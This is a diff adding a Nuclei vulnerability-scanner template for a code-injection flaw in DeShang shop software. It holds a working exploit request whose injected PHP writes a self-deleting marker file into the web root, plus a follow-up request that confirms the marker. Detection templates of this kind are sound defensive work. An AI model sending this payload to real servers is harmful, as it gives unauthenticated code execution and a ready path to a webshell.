@@ -1,0 +1,56 @@
+id: deshang-article-codeinjection
+
+info:
+  name: DeShang /index.php?s=home/article/index - Code Injection
+  author: qwtd
+  severity: critical
+  description: |
+    DeShang is affected by a code injection vulnerability in /index.php?s=home/article/index.
+    A remote attacker may inject malicious PHP code through crafted request parameters and cause
+    arbitrary code execution on the server, potentially leading to webshell deployment and full server compromise.
+  remediation: |
+    - Upgrade to a vendor-fixed version or apply the official security patch as soon as possible.
+    - Strictly validate and sanitize user-controlled parameters before they are processed by the application.
+    - Disable dangerous PHP functions where possible and harden file write permissions on the web root.
+    - Restrict public access to sensitive endpoints and monitor for unexpected PHP file creation.
+    - Review logs and web directories for indicators of compromise, then rotate any exposed credentials.
+  impact: |
+    Successful exploitation may allow an unauthenticated attacker to execute arbitrary PHP code,
+    write malicious files into the web root, deploy persistent webshells, steal sensitive data,
+    and completely take over the affected server.
+  reference: []
+  classification:
+    cwe-id: CWE-94
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: deshang
+    product: deshang
+    verified: false
+    max-request: 2
+  tags: 德尚商城
+
+http:
+  - raw:
+      - |
+        POST /index.php?s=home/article/index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+        Cookie: cart=AAy55Yx63XBVVv92xG_Mjp47gS7Kz8Q4yWN43JG5FBAGYUKdaUSGFc5IOUEZuu9sb-G6vK26S3_to4B5-OCV9r5Jv_AqDW0InYCm6cLlH8PJJhAodxPbVnGIa0y2K8JGiO2paoJrbQE6qf_tIiGn-lJGQn9LH31LcFtYbhOk-BC3zuDM9QvGNcNp2zQ4ut7YOtRKyE1rf6-4vK4JyG1tUWM16uO38k1MXT2LYc3Z_tQ3C7No_IMsFA52VwIbWIBF2vAXhUKZaoAZzbKnLq_a2W0LEnA3eODUJ77N3B4ags-ofeIUyVDXXbJ4pv9H8UCNaTAZCS815dD5y8yY7VBoWX58aVxtwbPZaFC3xbx6HDAa86uLrNHlqqKHf0OLt-4HB2BrJhMmC8y1qrRpCW9K_kHZ_qzbCf_uIwJoyfK1Ra9sveCqEGtZ7vOk6gPHvSPrRa-3kULbS7AMny97Y29DH6e6JTGLIvL45KKwrXXH3G3-VZZx9ry2aYL5aXHSmaME3L19oEt23dJCaWfIYeH7k6WNn-C86ajL6j53b6e8ME7PoCiP1tM2Zrb75Ux8pLMKHWDMFacK4xEwFp2FJK6NmmX2FCMRpqh2cDLH4XK5ZxdxbY1H1O_MW9h57CmBJYpzaTYM2KgKUz3L5hh10NHBqlnHYKVAFqnSXmOuaOhDKbVAquP1K8GAWpsEVFh78346LgHxoGsOoaj-VfqMbJEvFpcLcaURmaQ_kyxInGr1ZHy9Yr1-Z6z-b3TK5e_-1pc15rL_JMc0YzKCFmIH0r0Cq4o24d3B6qIGJG0EWJZKJWFuZvrDH_v7b2e3s0vO2ugGEBByrKm4Lg0_If5IEGB-FLPEYwoBFxMPpK6NmmX2FC-Tpq82bnULIWY87CUCLgPRp2FLV4p5dPgxY0MzafPM3OtI3bSO5JhAo1xPaFoKHyVEFiSUqiD8Z6oG7bQE6m5_tIFFYWmJXpm5c3eAqoHtLDgOnmg-GP-DLxM0XVZHMagRmeUD0KFMpes1oD--YrbBcW_1tUbMWSuL3JFz5DX7n7c5rLkU1m4NXLnBbh47EBkB82ICJ2JEFJbN4yjA5zfO7bwALVb2NcjS3eNHY1XxaKo9bgStIfeIUyOIleWEsJAwXN6IJK_OYeP2FyTH5y7zbv6LbDK5caqxt85H1OFG3xbx6zg15bVvL3PRHiiE3PaLphh10NHBqlnHYKVAGO8Rq-V45fdDKbVEKuP0K8qO2ZtJodh_qbbAacGtZ7vOk6gPHvS_85Q4U5OHMalSWeQ2E-tR3Fr7aWiPYvLAZKu9roSE2WE93JJ_sXUD4ba3JzkUFuiPon1LJou7YdRBKuaGVuH3m-dNIu9vr7FMrTwyalb3M06BGakDXlU2ZKj7JQH8pLNIXiGN3XSJJBI91wVBJWUSYee5IOTR3m39p7LMHXa8LOR_dsMRombFlYp5dPgDI0MzaDORFmdFUzz-JhL-XZjFsuyMm-sEGO7E2i98cHBEqbmDauO2akCFYmrJE5q2crI6HEs7aftJnqoQFjQH49A-2NXLZ6dRHK54ECHVJeu1rb6P4n138W0wqobHYe7P1xbz6r8-YAW5XrDQ365PnXLFZIu7YdRBauaGYSIBH2UPJWJ8Jyk9LbwAKmf3tIqE4G9L41U893U64Yt-ZGnLYaXPVvdJbYw9Gd6IdaEJl2T-UyuUoGM2c3T9XDK5Z6qxbY1QlSZPXwl0cL7D6I6uL3WLkGiE3PaPJhh00NrPaGaHltX0Blk
+
+        img=if(!is_dir($_SERVER['DOCUMENT_ROOT'].'/uploads/')){mkdir($_SERVER['DOCUMENT_ROOT'].'/uploads',777,true);}file_put_contents($_SERVER['DOCUMENT_ROOT'].'/uploads/uploadHello.php',hex2bin('3c3f706870206563686f206d64352831293b20756e6c696e6b285f5f46494c455f5f293b203f3e'));
+  - raw:
+      - |
+        GET /uploads/uploadHello.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
+        part: body
